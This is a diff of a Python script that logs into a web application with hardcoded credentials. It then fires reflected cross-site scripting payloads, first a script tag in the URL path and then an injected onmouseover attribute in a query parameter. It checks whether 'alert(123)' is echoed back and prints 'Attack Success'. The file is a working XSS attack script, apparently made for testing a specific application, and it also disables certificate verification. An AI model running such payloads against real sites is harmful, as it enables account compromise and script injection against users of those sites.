@@ -26,8 +26,15 @@ def self_checkIfCanLogin(s,payload, loginurl, header):
 
 
 with requests.Session() as s:
-    self_checkIfCanLogin(s,{"login": "admin", "password": "admin", "_qf__login_form": "123"},
+    self_checkIfCanLogin(s,{"login": "professor", "password": "professor", "_qf__login_form": "123"},
                          'https://app5.com/www/index.php', defaultHeader)
-    r = s.get("https://app5.com/www/index.php/'><script>alert(123);</script>",verify=False)
+    #attacking!
+    r = s.get("https://app5.com/www/professor.php?ctg=%22%20onmouseover=%22alert%28123%29&user=professor&op=profile",verify=False)
     f2 = open('tmp04.html', 'w')
     f2.write(r.text.encode('utf-8'))
+    IsAttackSucces=r.text.encode('utf-8').find('alert(123)')
+    print IsAttackSucces
+    if(IsAttackSucces>0):
+        print 'Attack Success'
+    else:
+        print 'Failed'
